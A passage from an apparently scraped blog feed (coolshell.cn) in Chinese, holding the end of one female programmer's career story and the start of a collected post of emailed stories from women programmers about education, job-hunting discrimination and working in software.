<p style="padding-left: 30px;"><span style="color: #000000;">经同学介绍，去了第三家实习公司，面试的经理对实习生要求不高，让我能有机会实习。做的是银行和证券公司的网站，我主要做前端jsp的页面，同时我也选修了学校请的一位Weblogic的工程师开设的J2EE的课程。总算开始入门了。公司的同事很帮助我，有耐心让我了解了系统后台的架构。后来我随几位去客户那里出差，周末和晚上加班，为了他们临时改的需求。同事说，你一个女生出差一点不发憷啊。其实我一点不觉得累。同组的team lead没事就鞭策我说，你就甘心写code么，不能总是做开发，该为以后想想。但是我当时想法是，我的视野当时有限，还不确定自己能做成什么样子。我在这家公司完成了毕业论文。然后毕业。</span></p>
<p style="padding-left: 30px;"><span style="color: #000000;">毕业找工作，我没有留在实习的公司，我想多试试。找工作的经历不多，我去过联想面试，笔试过了，一面是HR面，题目现在大概还记得，如果有化学家，天文学家，医生，乞丐，孕妇，在一个荒岛上，你只能带走一个，你带走谁呢？分组讨论，得出一致的结论，也要说出自己的结论。 同组有清华的毕业生，真的很自信，她说要带走天文学家。我说，出于人道，我肯定带走孕妇。后来就没了消息。难道医生可以留下照顾孕妇么，还是HR以为我选孕妇是注重家庭的人，没有事业心呢，我觉得这题真的不能说明什么。</span></p>
<p style="padding-left: 30px;"><span style="color: #000000;">之后面试了一家日资企业，一面是很多人一起面，我听了一圈之后，觉得自己有些把握，因为同组的人比我差，看来我运气挺好的。他们之中有本科生，有研究生，都是男生，就我一个女生。问的也挺基础，就是servlet如何工作，写没写过SP，其中有个人问，什么是SP，没人理他，我告诉他是store procedure。面试官是个部长。<strong>后来HR的人过来让我留下二面，说我一面打败了所有男士。</strong>说来惭愧，我真的是运气好，没碰到牛人。二面经理只问了些平常的问题，就过了，于是我来到这家工作。考虑的是，外企多少工作流程上比较规范，也见见日本人是怎么工作的，还有就是自己能力有限，欧美大公司估计是没戏的，我还是从力所能及的开始吧。</span></p>
<p style="padding-left: 30px;"><span style="color: #000000;">日本人工作的风格大家应该有所耳闻，就是喜欢加班，我进公司的第一个项目是代码改造，把VB6.0d code重写为VB.net。 加班到凌晨是常事，另外一个就是team lead的风格是没事也不能早走，也得耗到半夜才行。开始做的真是一点技术含量都没有，都是日本人写好guide，告诉你什么改成什么，别问为什么，不能有异议，他们怎么说你怎么改。弄得我当时都不去思考这里的技术细节，这是我当时犯傻的表现。除了技术本身，还有很多需要学习的。后来陆续做了一些我喜欢的java的项目，用到了sping，hibernate，ibatis, struts, ant等等。还有一些日本人自己开发的框架。每个项目的业务也都不同。在这家工作了三年，我觉得这不是我要的，我的技术提高有限，做的事都是别人设计好，甚至告诉你code应该如何写，而且做事风格不是我想要的。 我想去欧美文化的公司试试。也想做通讯相关的。</span></p>
<p style="padding-left: 30px;"><span style="color: #000000;">同学帮我投简历，我面试一家对欧美的外包企业，一面是本公司的人面，问了项目情况，说了说英语，我准备还算充分，过了，二面是公司的客户面，到公司和客户开电话会议面试，第一次和老美直接对话，我虽说有点紧张，但是还是专心听他的问题，听不清的就让他重复一遍，我现在记得的一个问题是如何写出高效的SQL。面完回家等通知。过了几天我收到了offer。</span></p>
<p style="padding-left: 30px;"><span style="color: #000000;">客户是为运营商提供软硬件服务。我们做的是BOSS系统的一个模块。都是java api。 几乎用到了J2EE中定义的所有组件和java相关的框架。我在这家工作至今。技术从不熟悉到熟悉，业务逻辑从不熟悉到熟悉，都是在开发每个feature和改的defect中慢慢了解的，硕大的系统不允许我一口吃个胖子。<strong>只要脑子里绷根弦就每天都有进步</strong>。加班不是常事，但是也有紧张的时候。 有时候一个defect要跟踪成千上万行代码，你才知道哪里出了问题，这是需要耐心和细心的。给客户的客户做support的时候，<strong>经常被半夜的电话叫醒去看一个现场的问题，我不觉得累和烦，我觉得这是我价值的体现</strong>（当然这不会每天发生）。修复一个defect我会有一点小小的成就感，每天晚上回家方便的话也会看看邮箱，看看有没有紧急的事情。<strong>有的人认为你下班了就没必要再管工作邮箱了，但是我愿意这么做，我觉得这是我职业精神的一部分，也是工作态度</strong>。</span></p>
<p style="padding-left: 30px;"><span style="color: #000000;">偶尔会帮着公司招聘毕业生，有时候会遇到什么简单问题都答不上来的人，我感觉就像看见当初刚毕业的我，临走，我会说一句，没关系，回去好好准备，看看基础知识。</span></p>
<p style="padding-left: 30px;"><span style="color: #000000;">我曾经怀疑过自己是否适合做技术，总觉得自己不如男生，也总在问自己的路在哪。而且没有自信，曾经紧张到，有人看我打字，都紧张的手抖。到现在，我觉得做技术挺好，就像你说的，我清楚的认识自己，我不是技术大牛，就每天写着自己的code，了解业务，挺好，但是不代表我不上进。很多女同学现在都不做技术了，也不写code了，但是我还在做，甚至越来越喜欢，在中国有种普遍的想法是，作几年技术该转去做管理，否则认为你不成功，这是人云亦云的说法。我想我为什么不能一直做技术呢？虽然中国的大环境可能不适合你一直做技术，但是我愿意试试。我不愿意放弃多年来积攒的一点点优势。何况我现在工作上越来越得心应手，<strong>不久前，我收到客户的邀请，他们想让我transfer到美国或者加拿大成为他们的一员，我在等待漫长的人事流程，也有可能会pending。但是我无所谓，我现在自信，知道想要什么。一直做技术，怎么了，不行么？</strong></span></p>
<p style="padding-left: 30px;"><span style="color: #000000;"><strong>谈到男女程序员的问题，有些男人以技术强自居，而少了一点谦逊和工作的严谨。有些技术不强的，有些懒散，得过且过。都是我遇到过真实的人。同组的一个女生来了几个月就比一个来了一年多的男生上手快，这说明什么的，态度和努力是重要的。我更认同的是技术和男女无关，和个人有关，任何以偏概全都是片面的</strong>。</span></p>
<p style="padding-left: 30px;"><span style="color: #000000;">同组的男同事们没有因为我是女性而轻视我，我很感谢他们，在一个team工作，技术是必要条件不是充分条件，合作，交流，态度，遵守流程，任何一个都缺少不了。<strong>如果我只是技术差点，那么我提高的空间是很大的。 多看看书，真的不难</strong>。虽然我可能离amazon或者是google这些企业的要求还有差距，但是那是我的方向<strong>。不过像baidu，腾讯这些流氓公司，给我多少钱也不去，女程序员也是有傲骨的</strong>，虽然也有可能他们看不上我的能力，但是，那又有什么所谓呢。</span></p>
<p style="padding-left: 30px;"><span style="color: #000000;">如果你能看完我这如白开水的文字，很感谢，因为我写的实在太不好了，这些经历普通不过，也证明我是个普通的人，<strong>如果我高中的时候不那么在意自己是不是优秀生，就能放轻松，大学（也在想这些）会有个好成绩，没准我就能如愿的毕业就进欧美大企业，不过那样我可能也少了以上跌入谷底的经历和现在平和的心态，我想后者对我更有意义</strong>。</span></p>
<p style="padding-left: 30px;"><span style="color: #000000;">不用署名，有的话，一个女程序员，哈哈。有错误处，见谅，中午休息，仓促的回顾了这些。技术本身心得有限，我就不班门弄斧了，还需努力。也请不要注我的微薄行号啦。另外我老公也是程序员，我和他能谈些技术和项目上的事情，我想是非女程序员感受不到的乐趣，哈哈哈。</span></p>
<p>看到这里你还不想为她鼓掌吗？</p>
<p>最后，请让我我再次征集——</p>
<p>call 所有的女程序员，我想给你们写一篇blog，希望你们能和我分享你们的程序员的经历和技术心得。你是男程序员也没有问题，也欢迎分享你身边女程员的故事。 大家可以发邮件至：haoel(at)hotmail.com</p>
<p>（全文完）</p>
 ]]></content>
<pubDate>2011-12-30T10:25:02+08:00</pubDate>
<guid>https://coolshell.cn/articles/6312.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 程序员因为女孩而美丽！ ]]></title>
<link>https://coolshell.cn/articles/6346.html</link>
<content><![CDATA[ 
<p><span style="color: #cc0000;"><strong>女程序员是程序员里美丽的风景线，我希望这些女程序员的经历能让我们</strong><strong>在这个“重男轻女”的社会中可以给女程员有更多平等的机会和条件，以及相应的尊重</strong><strong>。</strong><strong>因为，她们其中不乏优秀的程序员，而且在心态、态度和努力上还强过很多男性程序员，很多东西都值得我们大家<strong>向她们学习</strong></strong></span>。</p>
<p>这篇文章的来由是因为Eva在“<a title="三个事和三个问题" href="https://coolshell.cn/articles/6142.html" target="_blank">三个事和三个问题</a>”的评论里<a href="https://coolshell.cn/articles/6142.html/comment-page-1#comment-113406" target="_blank">问我女孩子是否能做技术</a>，她说她的很多师兄都告诉他不要做技术，所以，她有些不坚定了。我的回复是告诉了她我工作经历中的两个技术很牛的女孩，并且我从她们身上学到了多技术。但是，后面有一些人回复说我误导了别人。所以，我在<a href="https://weibo.com/1401880315/xE597iX6J" target="_blank">新浪微博</a>和<a href="https://twitter.com/#!/haoel/status/151856699387547649" target="_blank">twitter</a>上征集女程序员的故事和想法。我一共收到了19封邮件，其中有17封邮件来自女程序员。其中有一个已经发布了（<a title="一个女程序员的故事" href="https://coolshell.cn/articles/6312.html" target="_blank">一个女程序员的故事</a>），其中的一些观点已经在网上传播，并得到了大家的刮目和称赞。但这并不是特例，因为下面的这些故事中，还有很多令人刮目相看的东西。</p>
<p><strong>说明</strong>：先说明一下，这篇文章并不想讨论女孩子是不是适合做技术，这不值得讨论，因为，在“<a title="一个女程序员的故事" href="https://coolshell.cn/articles/6312.html" target="_blank">一个女程序员的故事</a>”中我们已经知道，态度和努力才是原因，而不是性别。这里，也只是想告诉那些有“性别歧视”、“看不起女程序员”、“骄傲自大”的男程序员们，那些女程序员不为所知的一面。<strong>我把几乎所有的故事都列在这篇文章里了，我觉得我不用再多说什么了，这些故事组成的风景线，可以让你充分地了解女程序员</strong>。</p>
<figure id="attachment_6378" aria-describedby="caption-attachment-6378" style="width: 337px" class="wp-caption aligncenter"><img alt="image placeholder" ><figcaption id="caption-attachment-6378" class="wp-caption-text">Ada Lovelace 世界第一个程序员</figcaption></figure>
<p>在看到那些故事之前，我们需要了解这样的现实——</p>
<p><span id="more-6346"></span></p>
<ul>
<li>
<strong>大多数女孩子并不喜欢技术</strong>。这点从我们的计算机专业的学校就可以看到了。我上大学时，两个专业60个同学，有15个女生，男女比例已经失衡。不过，这些女生今天基本全部都还在做技术。现在，十多年了，她们其中女生还在各个公司的技术部门，主要做 开发和运维。这些是70后的女生。对于80后和90后的女生来说，可能喜欢技术的就更少了。<span style="color: #003366;">Gavin在来信中说：“我们学院每届大约有800名学生，也就是说每年整个计算机学院只有大约50名女生。在这50名女生中，据我所知有至少一半的女生从开始到最后对编程一点兴趣都没有，这一半的女生有的准备跨专业考研，有的在考公务员，有的去了跟计算机专业几乎不沾边的行业去工作了，有的在大二的时候就已经开始修双专业了”。</span>不过，在这里我们来看看做技术的女孩子是什么样的。</li>
</ul>
<div></div>
<ul>
<li>
<strong>女孩子在找工作的时候总是会被歧视</strong>。很多用人单位都会问女孩子生孩子的问题，这简直就是干涉隐私和性别歧视，要在西方国家里，完全可以对这样的公司进行起诉。对于这种不尊重女性的公司，无论男女，一定不会尊重员工的。所以，这样的公司一定不要去。而很多女孩也会觉得结婚生子后就不能再从事技术了，所以，她们也对技术行业的未来没有信心。<span style="color: #003366;"><strong>Myma</strong>在来信中说：“女人做技术最怕就是世俗的偏见，尤其是过了30，生了孩子，明显感觉出来了，职业瓶颈”。 <strong>召娣</strong>说：“面试的时候会问有没有男朋友，下一步会不会结婚，接下来就是会不会要孩子之类的”</span>，几乎所有的女程序员都在说这个事。</li>
</ul>
<div></div>
<ul>
<li>
<strong>自大的男程序员看不起女程序员</strong>。女程序员在工作中受到太多的不公平的待遇了。就连平时男程序员们都以一种高人一头的语气和她们说话。这样的例子太多了，在我blog中的回复中，在平时，我们都可以看得到。而我们的大多数的女性都会因为别人看不起而失去信心。当然，这点男程序员也一样，因为技术好的人总是会看不起技术不好的人。这是技术人员的通病。<span style="color: #003366;"><strong>冰</strong>在来信中说：“另一个困扰的问题是，可能女生少的原因，在本部门风言风语不断，给我个人生活不少的精神压力，平时同事也会半开玩笑的说，嫁了吧，写什么代码，而且跟一些比较资深的程序员聊天时，总会呵呵的轻笑，然后说你是程序员啊。。。部门一些杂务，通常都扔了给我处理，这个我觉得吃点亏也没什么大事，但是就是忍受不了那种受轻视的感觉”。<strong>Cathy</strong>说：“项目组的组长是一个博士，人很好但是不太会和女孩子打交道，或者说有一些性别歧视吧。”</span>
</li>
</ul>
<div>但是这些现实中的东西，对于我们的女程序员来说算不了什么！不信，你看看他们的故事。<strong>至少你会发现，做技术的女孩一点也不浮华</strong>！</div>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1"><li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-1" href="#%E5%A5%B3%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E6%95%85%E4%BA%8B" title="女程序员的故事">女程序员的故事</a><ul class="ez-toc-list-level-5">
<li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-2" href="#%E7%A8%8B%E5%BA%8F%E5%91%98%E5%9B%A0%E4%B8%BA%E5%A5%B3%E5%AD%A9%E8%80%8C%E7%BE%8E%E4%B8%BD%EF%BC%81" title="程序员因为女孩而美丽！">程序员因为女孩而美丽！</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-3" href="#Shaofei_-_%E5%A6%88%E5%A6%88%E6%98%AF%E4%B8%AA%E7%A8%8B%E5%BA%8F%E5%91%98" title="Shaofei – 妈妈是个程序员">Shaofei – 妈妈是个程序员</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-4" href="#zxy_snow_-_%E5%8D%8A%E5%A5%B3%E7%A8%8B%E5%BA%8F%E5%91%98%E6%B5%81%E6%B0%B4%E8%B4%A6" title="zxy_snow – 半女程序员流水账">zxy_snow – 半女程序员流水账</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-5" href="#%E7%92%80%E7%92%A8_-_%E6%97%B6%E5%88%BB%E5%87%86%E5%A4%87%E7%9D%80" title="璀璨 – 时刻准备着">璀璨 – 时刻准备着</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-6" href="#%E5%86%B0_-_coding%E6%98%AF%E6%88%91%E4%BB%AC%E7%9A%84%E5%85%B1%E5%90%8C%E8%AF%AD%E8%A8%80" title="冰 – coding是我们的共同语言">冰 – coding是我们的共同语言</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-7" href="#Maya_Maya_-_%E5%B7%A6%E6%89%8B%E4%BB%A3%E7%A0%81%EF%BC%8C%E5%8F%B3%E6%89%8B%E8%AF%97" title="Maya Maya – “左手代码，右手诗”">Maya Maya – “左手代码，右手诗”</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-8" href="#Joyic_-_%E5%8F%AA%E8%A6%81%E5%8A%AA%E5%8A%9B%EF%BC%8C%E4%B8%80%E5%88%87%E7%9A%86%E6%9C%89%E5%8F%AF%E8%83%BD" title="Joyic – 只要努力，一切皆有可能">Joyic – 只要努力，一切皆有可能</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-9" href="#%E5%8F%A8%E5%8F%A8_-_%E4%B8%BA%E4%BA%86%E5%BF%98%E5%8D%B4%E7%9A%84%E7%BA%AA%E5%BF%B5-%E6%88%91%E5%9C%A8%E6%81%92%E7%94%9F%E7%9A%84%E4%B8%83%E5%B9%B4" title="叨叨 – 为了忘却的纪念-我在恒生的七年">叨叨 – 为了忘却的纪念-我在恒生的七年</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-10" href="#Kelan_-_%E5%9C%A8coding%E5%92%8C%E4%BF%AE%E5%A4%8Dbug%E4%B8%AD%E4%BA%AB%E5%8F%97%E6%97%A0%E9%99%90%E7%9A%84%E5%BF%AB%E4%B9%90%E5%92%8C%E4%BB%B7%E5%80%BC%E6%84%9F" title="Kelan – 在coding和修复bug中享受无限的快乐和价值感">Kelan – 在coding和修复bug中享受无限的快乐和价值感</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-11" href="#WaterMask_-_%E8%B8%8F%E8%B8%8F%E5%AE%9E%E5%AE%9E%E7%9A%84%E5%81%9Acoder%EF%BC%8C%E6%AF%8F%E5%A4%A9%E5%86%99%E5%A5%BD%E6%AF%8F%E4%B8%80%E8%A1%8C%E4%BB%A3%E7%A0%81" title="WaterMask – 踏踏实实的做coder，每天写好每一行代码">WaterMask – 踏踏实实的做coder，每天写好每一行代码</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-12" href="#%E7%A6%BE%E7%A6%BE%E6%9C%A8%E6%9C%A8_-_%E5%A5%B3%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%B7%AF%E5%8F%AF%E4%BB%A5%E5%BE%88%E9%95%BF" title="禾禾木木 – 女程序员的路可以很长">禾禾木木 – 女程序员的路可以很长</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-13" href="#Bana_-_%E6%88%91%E6%98%AF%E4%B8%80%E5%90%8D%E5%A5%B3%E7%A8%8B%E5%BA%8F%E5%91%98_%E6%88%91%E6%97%A0%E6%80%A8%E6%97%A0%E6%82%94" title="Bana – 我是一名女程序员 我无怨无悔">Bana – 我是一名女程序员 我无怨无悔</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-14" href="#Cathy_-_%E4%B8%80%E4%B8%AA%E9%9D%9E%E5%85%B8%E5%9E%8B%E7%9A%84%E5%A5%B3%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E6%9B%B2%E6%8A%98%E7%BB%8F%E5%8E%86" title="Cathy – 一个非典型的女程序员的曲折经历">Cathy – 一个非典型的女程序员的曲折经历</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-15" href="#Linn_-_%E8%AF%AF%E6%89%93%E8%AF%AF%E6%92%9E%E7%9A%84%E7%A8%8B%E5%BA%8F%E5%91%98" title="Linn – 误打误撞的程序员">Linn – 误打误撞的程序员</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-16" href="#Nana_-_%E5%81%9A%E5%96%9C%E6%AC%A2%E5%81%9A%E7%9A%84%E4%BA%8B%EF%BC%8C%E6%89%80%E4%BB%A5%E5%BE%88%E5%BC%80%E5%BF%83" title="Nana – 做喜欢做的事，所以很开心">Nana – 做喜欢做的事，所以很开心</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-17" href="#Gift_-_%E5%BD%93%E4%B8%80%E5%90%8D%E6%88%98%E5%A3%AB%E5%B0%B1%E6%98%AF%E4%B8%80%E6%94%AF%E5%86%9B%E9%98%9F%EF%BC%8C%E9%82%A3%E4%BA%9B%E8%BD%AF%E4%BB%B6%E4%B8%8D%E9%9C%80%E8%A6%81%E5%B7%A5%E7%A8%8B%E7%9A%84%E6%97%B6%E5%80%99" title="Gift – 当一名战士就是一支军队，那些软件不需要工程的时候">Gift – 当一名战士就是一支军队，那些软件不需要工程的时候</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-18" href="#Zheng_-_%E6%B0%B8%E4%B8%8D%E6%94%BE%E5%BC%83%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E5%B7%A5%E4%BD%9C" title="Zheng – 永不放弃程序员的工作">Zheng – 永不放弃程序员的工作</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-19" href="#%E5%A5%B3%E7%A8%8B%E5%BA%8F%E5%91%98%E4%BB%AC%EF%BC%8C%E4%B8%BA%E4%BD%A0%E4%BB%AC%E9%AA%84%E5%82%B2%EF%BC%8C%E7%A5%9D%E4%BD%A0%E4%BB%AC2012%E5%B9%B4%E6%9B%B4%E4%B8%8A%E4%B8%80%E5%B1%82%E6%A5%BC%E3%80%82" title="女程序员们，为你们骄傲，祝你们2012年更上一层楼。">女程序员们，为你们骄傲，祝你们2012年更上一层楼。</a></li>
</ul>
</li></ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E5%A5%B3%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E6%95%85%E4%BA%8B"></span>女程序员的故事<span class="ez-toc-section-end"></span>
</h4>
<p>下面的故事，都是原文，没有经过任何编辑。下面的故事，很多也很长，她们串成了一个非常美丽的风景线，<strong>我真的希望你有空能读一读这些故事。你会发现这些故事都有我们自己的身影</strong>。</p>
<p>真的非常感谢大家对我的信任，给我发来这么多的故事，谢谢你们的支持。我完全相信——</p>
<h5 style="color: #cc0000; text-align: center; font-size: 20px;">
<span class="ez-toc-section" id="%E7%A8%8B%E5%BA%8F%E5%91%98%E5%9B%A0%E4%B8%BA%E5%A5%B3%E5%AD%A9%E8%80%8C%E7%BE%8E%E4%B8%BD%EF%BC%81"></span>程序员因为女孩而美丽！<span class="ez-toc-section-end"></span>
</h5>
<div style="font-family: 'Microsoft YaHei'; font-size: 13px; background-color: #fafafa; border: solid 1px #EEE; margin: 4px 5px 4px 30px; padding: 0px 10px 0px 10px; border-radius: 10px; box-shadow: inset 0 0 4px rgba(0,0,0,0.5);">
<h5 style="font-size: 15px; margin: 5px 0px; border-bottom: solid 1px #CCC;">
<span class="ez-toc-section" id="Shaofei_-_%E5%A6%88%E5%A6%88%E6%98%AF%E4%B8%AA%E7%A8%8B%E5%BA%8F%E5%91%98"></span>Shaofei – 妈妈是个程序员<span class="ez-toc-section-end"></span>
</h5>
<p>1.我老妈是程序员，老朽今年二十有七了，可以想象年龄。</p>
<p>2.她20来岁的时候，背着全部门写的程序——一卷打孔纸带去北京上机调试，要排机时，还要给重要的项目让路，改程序么，就是把纸带剪断，用胶粘一段上去之类的。</p>
<p>3.她们那个时代的程序员都是直接读机器码的，大约就是5665表示begin之类的东西，而且是用打孔纸带二进制表示的，嗯，小时候有印象，她读程序就是站在床上一手拿着纸带卷，另一手抽着读，读过的就拖到地上。</p>
<p>4.好吧，那个时代的程序员应该坚持到现在的不多，很遗憾她中间也转了管理又转了市场，后来创创业也没成，于是现在待在家里悠闲。</p>
</div>
<div style="font-family: 'Microsoft YaHei'; font-size: 13px; background-color: #fafafa; border: solid 1px #EEE; margin: 4px 5px 4px 30px; padding: 0px 10px 0px 10px; border-radius: 10px; box-shadow: inset 0 0 4px rgba(0,0,0,0.5);">
<h5 style="font-size: 15px; margin: 5px 0px; border-bottom: solid 1px #CCC;">
<span class="ez-toc-section" id="zxy_snow_-_%E5%8D%8A%E5%A5%B3%E7%A8%8B%E5%BA%8F%E5%91%98%E6%B5%81%E6%B0%B4%E8%B4%A6"></span>zxy_snow – 半女程序员流水账<span class="ez-toc-section-end"></span>
</h5>
<p>自我介绍下，女，大三，某高校软件工程专业。</p>
<p>我想，严格意义上来说，我还算不上女程序员吧，还是一个弱弱的学生。</p>
<p>接触程序还是在大学开始，或者说，大一下接触ACM 之后吧。当初和朋友一起做ACM，这一年半，不停地学算法、刷题，也成就了一个水题博客（我的CSDN密码??），交到了很多其他大学的朋友，人外有人，深知这句话的意思。虽然算不上太聪明，不过不笨，另外，还算坚持，想想搞ACM 的时候，经常攒着电影没时间看放寒暑假回家看，看一个电影都能刷个题了都。现在想想，那些日子真的很开心。吃饭的时候可以想想，啊，这个应该用这个算法，和朋友们出去的时候可以一起讨论。用学长的话，有一个你可以一直在脑袋里想的问题，多好啊！庆幸自己遇到了ACM，做自己喜欢的事情，尽自己全力，在大学阶段，真的很难<br>
得。毕竟大学之前，就像机器一样，大家都这么做，我也就这么做，但是大学之后，是完全靠自己想法行动的，无论做什么，都是自己的意愿，这样很有成就感。</p>
<p>还记得，大二的时候，是好孩子，不想逃课，就印了题、算法、论文去课堂上看，看懂后果断逃课回去敲代码，哈哈，不是个好孩子呢！翘了不少课。寒暑假总被老妈说，说别学了，出去玩玩，哈哈！如果她知道我学的和课业无关她会不会还这么说，嘻嘻！</p>
<p>今年的11 月，区域赛结束后，算是告别ACM，开始踏上了网络方面的不归路。确切的说，是因为需要做课程设计。我用了俩星期从J2EE 啥也不懂然后和朋友们完成我们的项目，很开心。我想，这些学习能力、代码能力是ACM 给我的。开始一个完全未知的领域真的好难啊，各种不懂，我的“to learn list.txt”一大堆东西，慢慢来吧，近期把JS 的基础视频看完了，《正则表达式必知必》会看完了，struts2 视频正在学，寒假还有各种任务呢！哈，想想寒假我都好兴奋，寒假学习效率会很高的。当然，先应付完期末考试。引用另一位学长的话，搞ACM的要当学霸！优秀应该是各个方面的。</p>
<p>这次寒假的主要任务是做学校的在线测评系统，怎么说呢，我觉得这是又一件我真心想做并且想把它做得完美的东西。这样的感觉很少有了，但是这次，我真心想把它弄好，所以学架构，写需求分析，数据库设计，学各种需要的知识，但是总感觉，学得越多，自己越需要学的东西就越多，不过，只要开始学了，就有进步的。</p>
<p>不知道符合要求不，似乎又写了一篇流水账，所以说我觉得我还不算是程序员，不过未来很希望成为一名程序员，写代码多开心呐！</p>
</div>
<div style="font-family: 'Microsoft YaHei'; font-size: 13px; background-color: #fafafa; border: solid 1px #EEE; margin: 4px 5px 4px 30px; padding: 0px 10px 0px 10px; border-radius: 10px; box-shadow: inset 0 0 4px rgba(0,0,0,0.5);">
<h5 style="font-size: 15px; margin: 5px 0px; border-bottom: solid 1px #CCC;">
<span class="ez-toc-section" id="%E7%92%80%E7%92%A8_-_%E6%97%B6%E5%88%BB%E5%87%86%E5%A4%87%E7%9D%80"></span>璀璨 – 时刻准备着<span class="ez-toc-section-end"></span>
</h5>
<p>我：大四在一家叫食草堂的公司做网络管理及网店运营，但基本用不到专业知识。毕业后男朋友坚持不让我再随便找工作，他一个人挣钱并供我去学习java语言，学习了8个月找到了一份做ip网管软件的公司，男友在一家培训机构做教师，后来渐渐觉得不快乐不充实，被封闭在这样的空间内，不能去接触新技术新人，视野渐渐狭窄。于是我们一起辞职从天津来到了杭州，只面试了一家就来上班了，当时觉得自己能力有限，不应该是我挑工作。。。在这里做手机阅读网站，接触不到数据库，我们负责的是中间层，将数据从接口取出展示在页面上，由于我工作积极主动活泼开朗，喜爱解决疑难杂症，又爱组织这个那个的，PM将我提升为开发组负责人，但是转眼一年多过去了，我并没有觉得有成就感，相反觉得自己在技术上一事无成、在管理上又不专业，不想走管理的道路。这一年来我和男友去上海参加了几次技术大会，每回回来都会热血沸腾，我工作很忙又懒惰，导致技术水平一直无法提高，很多书都没看。每天都有强烈的自责感，但又觉得没有学不会的东西，所以就无法放弃。也因为自己对技术能力表示质疑，不敢去大的公司应聘，导致现在总是时刻准备着。。。</p>
<p>回想这些年，我心中所树立的理想、信念，我对it行业的向往、甚至我现在的自责感，都和男友对我的影响有关，他的眼界和思考能力要远高于我认识的人，所以有时候我想我的某些思想是依赖于他的更新而更新的。是那种容易被别人感化的人。</p>
<p>说说其他的女程序员吧，她们之前的人生经历我不说了，就聊一聊我认识的几种女生在工作上的类型吧。</p>
<p>我的同事A：刚毕业没多久的小女生，我每天从男友那里或者我自己这里获得的最新新闻和哲理我都会讲给她听，她认真听，回去也看书，每次都会骄傲的对我说又看完一本了，但技术始终上不来，这大概是那种应试教育下的女生代表类型，就像我们计算机系当年得前三名的女生一样，在实际工作后比不上倒数几名的男生。</p>
<p>我的同事B：已经做妈妈了，工作出色，考虑事情全面，只是她的生活完全和世界脱轨，新事物几乎不接触，新技术也是，但是如果工作用到她会积极去学，并且能把工作做好，对未来没有规划，过好日子就行。</p>
<p>我的同事C：毕业时是C的佼佼者，毕业后一年多就落后了，被爱情和无聊的日子所累，也总是自责，但找不到学习的方向。</p>
<p>看过这么多女程序员的状态，对于自身没有坚定信念和方向的我们来说，我觉得工作环境真的很重要，每天身边是什么人在交流，是什么人在一起工作，团队氛围如何，都会潜移默化影响着每个人，自身的努力和态度也固然不可忽视。</p>
</div>
<div style="font-family: 'Microsoft YaHei'; font-size: 13px; background-color: #fafafa; border: solid 1px #EEE; margin: 4px 5px 4px 30px; padding: 0px 10px 0px 10px; border-radius: 10px; box-shadow: inset 0 0 4px rgba(0,0,0,0.5);">
<h5 style="font-size: 15px; margin: 5px 0px; border-bottom: solid 1px #CCC;">
<span class="ez-toc-section" id="%E5%86%B0_-_coding%E6%98%AF%E6%88%91%E4%BB%AC%E7%9A%84%E5%85%B1%E5%90%8C%E8%AF%AD%E8%A8%80"></span>冰 – coding是我们的共同语言<span class="ez-toc-section-end"></span>
</h5>
<p>昨天见到了你的关于女程序员的征文，也趁着年末，给个小小的回顾自己吧。也算不上什么经验，只是谈下个人经历感受。</p>
<p>上大学第一天就知道，班里面只有4个女生，但也并没有任何特殊优厚待遇，一般开什么班会，都是女生迁就男生，大老远跑他们那边去开会，常感受到的是，特别容易被老师或同学质疑，这个是你做的吗？你完成上机实验了吗？要独立完成等等。。。</p>
<p>印象比较深刻的是，有一次，电脑坏了，找男生修，结果他说身为计算机专业的女生，连个都不会，在以后的日子里，我就没有再去麻烦过他，也许他们是那些所谓的Geek，但我理解不了这份傲慢，牛人多的去，尤其在我现在工作的公司，一位资深架构师，不论问题大小，都会给你很好的解答，并进一步发散问题，每次聊天都受益匪浅。当然这些也只是少数，大学里面是最好的学习环境，而且很奇怪地，我发现，学习好的女生，都是在一个宿舍，而不学无术的，又会在一个宿舍，工作以后，大半都没有再从事计算机方面的工作了，要么考个公务员，要么做个辅导员，或去个银行什么的。同生同是，一个宿舍里，好像就是一场编程的竞赛，谁更努力，谁更有资本炫，也许这是学习的动力。</p>
